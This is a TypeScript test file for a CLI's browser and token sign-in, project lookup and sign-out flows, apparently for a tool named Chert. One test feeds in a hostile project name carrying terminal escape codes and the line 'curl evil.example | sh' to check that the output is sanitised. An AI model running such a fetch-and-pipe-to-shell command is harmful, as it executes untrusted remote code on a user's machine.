import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, rmSync, statSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { confirmSession, login, type LoginDeps } from '../../src/dev/command.js';
import { claimLine, controlClient } from '../../src/dev/claim.js';
import { revokeCredential, type DeviceLoginDeps } from '../../src/dev/device-login.js';
import { credentialStore, logout, whoami } from '../../src/cli/login.js';
import { CLEAR_SCREEN, type SignInChoice, type Terminal } from '../../src/dev/welcome.js';
import type { WaitingInfo } from '../../src/dev/sign-in-screen.js';
import { CLIError } from '../../src/cli/errors.js';

const ORIGIN = 'https://control.example';
const P = '11000000-0000-4000-8000-000000000001', OTHER = '11000000-0000-4000-8000-000000000002';
const CREDENTIAL = `ftu_${'a'.repeat(43)}`;
const part = (value: unknown) => Buffer.from(JSON.stringify(value)).toString('base64url');
const sessionToken = `${part({ alg: 'HS256' })}.${part({ sub: 'user', email: 'dev@example.test', exp: Math.floor(Date.now() / 1000) + 3600 })}.c2lnbmF0dXJl`;
// What login itself writes to the screen, outside the screens it is handed: the clears.
const drawn: string[] = [];
const terminal = { color: false, truecolor: false, unicode: true, output: { write: (text: string) => { drawn.push(text); return true; } } } as unknown as Terminal;

function rig(options: { terminal?: boolean; keyboard?: boolean; remote?: boolean; choice?: SignInChoice | null; choices?: (SignInChoice | null)[]; unsupported?: boolean; piped?: string; pasted?: string | null; cancelOnScreen?: boolean; openFails?: boolean; approvalOrigin?: string } = {}) {
  const directory = mkdtempSync(join(tmpdir(), 'chert-sign-in-'));
  const records: Record<string, unknown>[] = []; const opened: string[] = []; const urls: string[] = []; let offered = 0; const remotes: boolean[] = [];
  const waited: WaitingInfo[] = []; let stops = 0; const notes: (string | undefined)[] = []; const selections: (number | undefined)[] = []; drawn.length = 0; const prompts: string[] = []; const terminals: Terminal[] = []; let reads = 0;
  const keyboard = options.keyboard ?? Boolean(options.terminal);
  const device: DeviceLoginDeps = {
    fetch: (async (input: string | URL | Request) => {
      const url = String(input); urls.push(url);
      // A Chert server from before browser sign-in has no such route.
      if (options.unsupported) return new Response('Not Found', { status: 404 });
      // The contract with the server: the approval page is on the origin that was asked.
      return url.endsWith('/logins')
        ? new Response(JSON.stringify({ data: { device_code: `fdc_${'d'.repeat(43)}`, user_code: 'KDTF-2937', verification_url: `${options.approvalOrigin ?? new URL(url).origin}/cli`,
          verification_url_complete: `${options.approvalOrigin ?? new URL(url).origin}/cli?code=KDTF-2937`, expires_in: 600, interval: 2 } }), { status: 201 })
        : new Response(JSON.stringify({ data: { status: 'approved', access_token: CREDENTIAL, email: 'dev@example.test', project: { id: P, name: 'Clinic' }, device_name: 'Test MacBook', expires_in: 2_592_000 } }), { status: 200 });
    }) as typeof fetch,
    pause: async () => {}, open: async url => { opened.push(url); return !options.openFails; }, now: () => Date.now(),
  };
  // Reading standard input when it is the keyboard fails the way Node does once the terminal stream has been touched.
  const deps: LoginDeps = { ...(options.terminal ? { terminal } : {}), keyboard, remote: options.remote ?? false, device,
    readPipe: () => { reads++; if (keyboard) throw Object.assign(new Error('EAGAIN: resource temporarily unavailable, read'), { code: 'EAGAIN' }); return options.piped ?? ''; },
    welcome: async (_terminal, remote, _version, _signal, start) => {
      offered++; remotes.push(remote); notes.push(start?.note); selections.push(start?.selected);
      return options.choices ? options.choices[offered - 1] ?? null : options.choice === undefined ? 'browser' : options.choice;
    },
    readHidden: async (t, prompt) => { prompts.push(prompt); terminals.push(t); return options.pasted === undefined ? sessionToken : options.pasted; },
    waiting: (_terminal, info, cancel) => { waited.push(info); if (options.cancelOnScreen) cancel(); return { stop() { stops++; } }; },
    revoke: async () => {} };
  const env = { CHERT_HOME: directory };
  const run = (args: string[] = [], extra: NodeJS.ProcessEnv = {}) => login(args, { ...env, ...extra }, new AbortController().signal, record => records.push(record), deps);
  return { run, records, opened, urls, offered: () => offered, remotes, notes, selections, drawn, waited, stops: () => stops, prompts, terminals, reads: () => reads, directory, store: credentialStore(directory), close: () => rmSync(directory, { recursive: true, force: true }) };
}
async function failure(promise: Promise<unknown>): Promise<CLIError> {
  try { await promise; } catch (error) { assert.ok(error instanceof CLIError, String(error)); return error; }
  return assert.fail('expected a CLIError');
}

test('sign in: in a terminal the welcome screen is shown and the browser choice signs this computer in to one project', async () => {
  const r = rig({ terminal: true });
  try {
    assert.equal(await r.run(), 0);
    assert.equal(r.offered(), 1); assert.deepEqual(r.opened, ['https://facetime.trychert.com/cli?code=KDTF-2937']);
    const saved = r.store.load()!;
    assert.equal(saved.kind, 'cli'); assert.equal(saved.project_id, P); assert.equal(saved.access_token, CREDENTIAL);
    assert.equal(statSync(join(r.directory, 'credentials.json')).mode & 0o777, 0o600);
    const done = r.records.find(x => x.code === 'signed_in')!;
    assert.match(String(done.message), /Signed in as dev@example\.test/); assert.match(String(done.message), /CONNECTED/); assert.match(String(done.message), /Project\s+Clinic/);
    assert.match(String(done.message), /Device\s+Test MacBook/); assert.match(String(done.message), /chert dev +In your agent's folder/); assert.match(String(done.message), /chert guide/); assert.equal(done.project, 'Clinic');
    assert.ok(!JSON.stringify(r.records).includes(CREDENTIAL), 'the credential is never printed');
    assert.equal(r.waited.length, 1, 'the waiting screen replaced the printed code'); assert.equal(r.waited[0]!.code, 'KDTF-2937'); assert.equal(r.waited[0]!.opened, true);
    assert.equal(r.waited[0]!.urlComplete, 'https://facetime.trychert.com/cli?code=KDTF-2937'); assert.equal(r.stops(), 1, 'and was taken down once the approval came');
    assert.equal(r.records.find(x => x.code === 'login_code'), undefined, 'so the code is not also printed as text');
    assert.deepEqual(whoami(r.store), { signed_in: true, email: 'dev@example.test', expires_at: saved.expires_at, project_id: P, project_name: 'Clinic' });
  } finally { r.close(); }
});

test('sign in: --device, a remote shell and a pipe never open a browser; only the remote terminal gets the screens', async () => {
  for (const [options, args, screens] of [[{ terminal: true }, ['--device'], 0], [{ terminal: true, remote: true }, [], 1], [{}, [], 0], [{}, ['--json'], 0]] as const) {
    const r = rig(options);
    try {
      assert.equal(await r.run([...args]), 0); assert.deepEqual(r.opened, []); assert.equal(r.offered(), screens); assert.equal(r.store.load()!.kind, 'cli');
      if (screens) {
        assert.deepEqual(r.remotes, [true], 'the welcome is told it is a remote shell');
        assert.equal(r.waited.length, 1); assert.equal(r.waited[0]!.remote, true); assert.equal(r.waited[0]!.opened, false);
        assert.equal(r.records.find(x => x.code === 'login_code'), undefined);
      } else {
        assert.equal(r.waited.length, 0, 'no screen without the welcome');
        assert.match(String(r.records.find(x => x.code === 'login_code')!.message), /on any device/);
      }
      const done = String(r.records.find(x => x.code === 'signed_in')!.message);
      if ('terminal' in options) assert.match(done, /CONNECTED/, '--device in a terminal still ends on the signed-in screen, printed into the flow');
      else { assert.match(done, /^\nSigned in as dev@example\.test · project Clinic\.\nNext: chert dev in your agent's folder/); assert.doesNotMatch(done, /CONNECTED|│|\x1b/, 'a pipe or --json gets plain text'); }
    } finally { r.close(); }
  }
});

test('sign in: when the browser cannot be opened the screen is told, and nothing is printed over it', async () => {
  const r = rig({ terminal: true, openFails: true });
  try {
    assert.equal(await r.run(), 0);
    assert.equal(r.waited[0]!.opened, false); assert.match(r.waited[0]!.note!, /Could not open a browser/);
    assert.equal(r.records.find(x => x.code === 'login_browser_unavailable'), undefined);
  } finally { r.close(); }
});

test('sign in: choosing 2 reads the session token at a hidden prompt and saves it like --with-token', async () => {
  const r = rig({ terminal: true, choice: 'token' });
  try {
    assert.equal(await r.run(), 0);
    assert.equal(r.store.load()!.kind, undefined); assert.equal(r.store.load()!.access_token, sessionToken);
    assert.deepEqual(r.urls, [], 'no device login was started'); assert.equal(r.waited.length, 0);
    const done = r.records.find(x => x.code === 'signed_in')!;
    assert.match(String(done.message), /Signed in as dev@example\.test/); assert.match(String(done.message), /Expires/); assert.doesNotMatch(String(done.message), /Project/);
    assert.match(String(done.message), /not bound to a\s+project/, 'a session token gets a word of explanation');
    assert.ok(!JSON.stringify(r.records).includes(sessionToken), 'the token is never printed');
    assert.equal(r.terminals[0], terminal, 'the prompt reads from the terminal');
    assert.ok(r.prompts[0]!.startsWith(CLEAR_SCREEN), 'on a cleared screen'); assert.match(r.prompts[0]!, /CHERT\s+·\s+Sign in/); assert.match(r.prompts[0]!, /Paste your Chert session token\. It stays hidden/);
  } finally { r.close(); }
  const quit = rig({ terminal: true, choice: 'token', pasted: null });
  try { const error = await failure(quit.run()); assert.equal(error.code, 'login_cancelled'); assert.equal(quit.store.load(), undefined); } finally { quit.close(); }
  const bad = rig({ terminal: true, choice: 'token', pasted: 'not-a-token' });
  try { assert.equal((await failure(bad.run())).code, 'invalid_token'); assert.equal(bad.store.load(), undefined); } finally { bad.close(); }
});

test('sign in: escape on the waiting screen cancels the sign-in, takes the screen down and saves nothing', async () => {
  const r = rig({ terminal: true, cancelOnScreen: true });
  try {
    const error = await failure(r.run());
    assert.equal(error.code, 'login_cancelled'); assert.equal(r.stops(), 1); assert.equal(r.store.load(), undefined);
    assert.equal(r.urls.filter(url => url.endsWith('/token')).length, 0, 'no poll after the cancel');
  } finally { r.close(); }
});

test('sign in: --backend and CHERT_CONTROL_ORIGIN choose the Chert address, and the approval page is on that same address', async () => {
  const a = rig(); const b = rig(); const c = rig({ terminal: true });
  try {
    await a.run(['--backend', ORIGIN]); assert.ok(a.urls.every(url => url.startsWith(ORIGIN)));
    assert.equal(a.records.find(x => x.code === 'login_code')!.verification_url, `${ORIGIN}/cli`);
    await b.run([], { CHERT_CONTROL_ORIGIN: 'https://staging.example' }); assert.ok(b.urls.every(url => url.startsWith('https://staging.example')));
    assert.equal(b.records.find(x => x.code === 'login_code')!.verification_url, 'https://staging.example/cli');
    await c.run(['--backend', ORIGIN]); assert.deepEqual(c.opened, [`${ORIGIN}/cli?code=KDTF-2937`], 'the browser is sent to the server that was asked');
  } finally { a.close(); b.close(); c.close(); }
});

test('sign in: a server that puts the approval page on another address is named; nothing is opened or saved', async () => {
  for (const options of [{ terminal: true }, {}]) {
    const r = rig({ ...options, approvalOrigin: 'https://facetime.trychert.com' });
    try {
      const error = await failure(r.run(['--backend', 'https://preview.example']));
      assert.equal(error.code, 'login_origin_mismatch');
      assert.equal(error.action, 'This Chert server sent a sign-in page on a different address (facetime.trychert.com). Update the CLI or check --backend.');
      assert.deepEqual(r.opened, []); assert.equal(r.waited.length, 0); assert.equal(r.store.load(), undefined);
      assert.deepEqual(r.urls, ['https://preview.example/api/v1/cli/logins'], 'the start request, and no poll');
    } finally { r.close(); }
  }
});

test('sign in: in a terminal a server without browser sign-in brings the menu back with a note, so 2 can be pressed without rerunning', async () => {
  const r = rig({ terminal: true, unsupported: true, choices: ['browser', 'token'] });
  try {
    assert.equal(await r.run(), 0);
    assert.equal(r.offered(), 2, 'the SIGN IN menu is shown again');
    assert.deepEqual(r.notes, [undefined, 'This Chert server does not offer browser sign-in yet. Press 2 to paste a token.']);
    assert.deepEqual(r.selections, [undefined, 1], 'with the pointer on the token row, so enter works too');
    assert.equal(r.prompts.length, 1); assert.equal(r.store.load()!.access_token, sessionToken); assert.equal(r.waited.length, 0);
    assert.deepEqual(r.records.map(x => x.code), ['signed_in'], 'no error was printed on the way');
    // Choosing 1 again asks again, and quitting from the returned menu is an ordinary cancel.
    const again = rig({ terminal: true, unsupported: true, choices: ['browser', 'browser', null] });
    try { assert.equal((await failure(again.run())).code, 'login_cancelled'); assert.equal(again.offered(), 3); assert.equal(again.urls.length, 2); assert.equal(again.store.load(), undefined); }
    finally { again.close(); }
  } finally { r.close(); }
});

test('sign in: outside a terminal, with --json or with --device a server without browser sign-in is still told to pipe a token', async () => {
  for (const [options, args] of [[{}, []], [{}, ['--json']], [{ terminal: true }, ['--device']]] as const) {
    const r = rig({ ...options, unsupported: true });
    try {
      const error = await failure(r.run([...args]));
      assert.equal(error.code, 'login_unsupported'); assert.equal(error.exit, 6);
      assert.equal(error.action, 'This Chert server does not offer browser sign-in yet. Use chert login --with-token < token.txt');
      assert.equal(r.offered(), 0); assert.equal(r.urls.length, 1); assert.deepEqual(r.drawn, []); assert.equal(r.store.load(), undefined);
    } finally { r.close(); }
  }
});

test('sign in: any other failure of the browser path clears the menu before the error line is printed', async () => {
  // Refused before a code was shown: only the menu is on screen, and nothing else would take it down.
  const early = rig({ terminal: true, approvalOrigin: 'https://facetime.trychert.com' });
  try {
    assert.equal((await failure(early.run(['--backend', 'https://preview.example']))).code, 'login_origin_mismatch');
    assert.equal(early.waited.length, 0); assert.deepEqual(early.drawn, [CLEAR_SCREEN]);
  } finally { early.close(); }
  // Once the waiting screen is up, taking it down is what clears; it is not cleared twice.
  const late = rig({ terminal: true, cancelOnScreen: true });
  try { assert.equal((await failure(late.run())).code, 'login_cancelled'); assert.equal(late.stops(), 1); assert.deepEqual(late.drawn, []); }
  finally { late.close(); }
  const piped = rig({ approvalOrigin: 'https://facetime.trychert.com' });
  try { assert.equal((await failure(piped.run(['--backend', 'https://preview.example']))).code, 'login_origin_mismatch'); assert.deepEqual(piped.drawn, [], 'a pipe is never sent a clear'); }
  finally { piped.close(); }
});

test('sign in: leaving the welcome screen saves nothing and touches no network', async () => {
  const r = rig({ terminal: true, choice: null });
  try {
    const error = await failure(r.run());
    assert.equal(error.code, 'login_cancelled'); assert.equal(error.exit, 130);
    assert.deepEqual(r.urls, []); assert.equal(r.store.load(), undefined);
  } finally { r.close(); }
});

test('sign in: --with-token still reads a pipe and refuses the keyboard', async () => {
  const piped = rig({ piped: sessionToken + '\n' }); const typed = rig({ terminal: true });
  try {
    assert.equal(await piped.run(['--with-token']), 0); assert.equal(piped.store.load()!.kind, undefined);
    assert.equal(piped.records.find(x => x.code === 'signed_in')!.message, 'Signed in as dev@example.test.');
    assert.equal((await failure(typed.run(['--with-token']))).code, 'login_input_required'); assert.equal(typed.offered(), 0);
  } finally { piped.close(); typed.close(); }
});

test('sign in: --with-token refuses the keyboard even when no screen can be drawn (--json, TERM=dumb, or the output piped)', async () => {
  for (const args of [['--with-token', '--json'], ['--with-token']]) {
    const typed = rig({ keyboard: true });
    try {
      const error = await failure(typed.run(args));
      assert.equal(error.code, 'login_input_required'); assert.equal(error.exit, 2); assert.match(error.action, /chert login --with-token < token\.txt/);
      assert.equal(typed.reads(), 0, 'the keyboard is never read'); assert.equal(typed.store.load(), undefined);
    } finally { typed.close(); }
  }
});

test('sign in: a failed sign-in leaves an existing credential alone', async () => {
  const r = rig({ terminal: true, choice: null });
  try {
    r.store.save({ access_token: sessionToken, expires_at: Date.now() + 60_000 });
    await failure(r.run());
    assert.equal(r.store.load()!.access_token, sessionToken);
  } finally { r.close(); }
});

async function withFetch<T>(respond: (url: string, init: RequestInit) => Response, run: (seen: { url: string; init: RequestInit }[]) => Promise<T>): Promise<T> {
  const previous = globalThis.fetch; const seen: { url: string; init: RequestInit }[] = [];
  globalThis.fetch = (async (input: string | URL | Request, init?: RequestInit) => { seen.push({ url: String(input), init: init ?? {} }); return respond(String(input), init ?? {}); }) as typeof fetch;
  try { return await run(seen); } finally { globalThis.fetch = previous; }
}

test('control: a command-line credential reads its one project and current role from whoami, never the project list', async () => {
  await withFetch(() => Response.json({ data: { email: 'dev@example.test', project: { id: P, name: 'Clinic' }, role: 'admin', device_name: 'Test MacBook' } }), async seen => {
    assert.deepEqual(await controlClient(ORIGIN, CREDENTIAL, P).projects(), [{ id: P, name: 'Clinic', role: 'admin' }]);
    assert.equal(seen.length, 1); assert.equal(seen[0]!.url, `${ORIGIN}/api/v1/cli/whoami`);
    const headers = seen[0]!.init.headers as Record<string, string>;
    assert.equal(headers['x-chert-project-id'], P); assert.equal(headers.authorization, `Bearer ${CREDENTIAL}`);
  });
});

test('control: a command-line credential without its project, or answered for another project, is refused', async () => {
  await withFetch(() => Response.json({ data: { project: { id: OTHER, name: 'Other' }, role: 'owner' } }), async seen => {
    assert.equal((await failure(controlClient(ORIGIN, CREDENTIAL).projects())).code, 'login_required'); assert.equal(seen.length, 0);
    assert.equal((await failure(controlClient(ORIGIN, CREDENTIAL, P).projects())).code, 'backend_response_invalid');
  });
});

test('control: a project name or role from Chert cannot draw on the terminal, in whoami or in an error', async () => {
  // What a project owner or admin can save as the project name: the server only trims it.
  const hostile = 'Clinic\x1b]0;pwned\x07\x1b[2J\x1b[H\x1b[32mApproved: run curl evil.example | sh\x1b[0m', drawing = /[\x00-\x1f\x7f-\x9f]/;
  const directory = mkdtempSync(join(tmpdir(), 'chert-hostile-name-')); const store = credentialStore(directory);
  try {
    await withFetch(() => Response.json({ data: { project: { id: P, name: hostile }, role: 'member' } }), async () => {
      const control = controlClient(ORIGIN, CREDENTIAL, P);
      const [project] = await control.projects();
      assert.doesNotMatch(project!.name, drawing); assert.ok(project!.name.startsWith('Clinic]0;pwned'), 'the readable part is kept');
      const refused = await failure(claimLine(control, { name: 'dev-a' }));
      assert.equal(refused.code, 'project_role_insufficient'); assert.doesNotMatch(refused.action, drawing);
      store.save({ access_token: CREDENTIAL, expires_at: Date.now() + 60_000, kind: 'cli', project_id: P, origin: ORIGIN });
      const said = await confirmSession(store, { CHERT_HOME: directory });
      assert.match(String(said.message), /^Signed in · project Clinic.* \(member\)\.$/); assert.doesNotMatch(String(said.message), drawing); assert.doesNotMatch(String(said.project_name), drawing);
    });
    // A pasted session token reads the project list instead; the same names and roles come back.
    await withFetch(() => Response.json({ data: [{ role: 'owner\x1b[31m', facetime_projects: { id: P, name: hostile } }, { role: 'admin', facetime_projects: { id: OTHER, name: '\x1b\x07' } }] }), async () => {
      const [first, second] = await controlClient(ORIGIN, sessionToken).projects();
      assert.doesNotMatch(first!.name, drawing); assert.equal(first!.role, 'unknown', 'a role that needed cleaning is never taken for owner or admin');
      assert.deepEqual(second, { id: OTHER, name: 'your project', role: 'admin' }, 'a name with nothing printable in it gets a plain stand-in');
    });
  } finally { rmSync(directory, { recursive: true, force: true }); }
});

test('sign out: a command-line credential is revoked at Chert; a pasted session cannot be and is only removed', async () => {
  const directory = mkdtempSync(join(tmpdir(), 'chert-sign-out-')); const store = credentialStore(directory);
  try {
    await withFetch(() => Response.json({ data: { revoked: true } }), async seen => {
      store.save({ access_token: CREDENTIAL, expires_at: Date.now() + 60_000, kind: 'cli', project_id: P });
      assert.deepEqual(await logout(store, token => revokeCredential(ORIGIN, token)), { signed_out: true, revoked: true });
      assert.equal(seen[0]!.url, `${ORIGIN}/api/v1/cli/logout`); assert.equal(seen[0]!.init.method, 'POST');
      assert.equal((seen[0]!.init.headers as Record<string, string>).authorization, `Bearer ${CREDENTIAL}`);
      store.save({ access_token: sessionToken, expires_at: Date.now() + 60_000 });
      assert.deepEqual(await logout(store, token => revokeCredential(ORIGIN, token)), { signed_out: true, revoked: false });
      assert.equal(seen.length, 1, 'a browser session token is never sent to the revoke endpoint');
      assert.equal(store.load(), undefined);
    });
    await withFetch(() => new Response('{}', { status: 500 }), async () => {
      store.save({ access_token: CREDENTIAL, expires_at: Date.now() + 60_000, kind: 'cli', project_id: P });
      assert.deepEqual(await logout(store, token => revokeCredential(ORIGIN, token)), { signed_out: true, revoked: false });
    });
    assert.throws(() => readFileSync(join(directory, 'credentials.json')));
  } finally { rmSync(directory, { recursive: true, force: true }); }
});
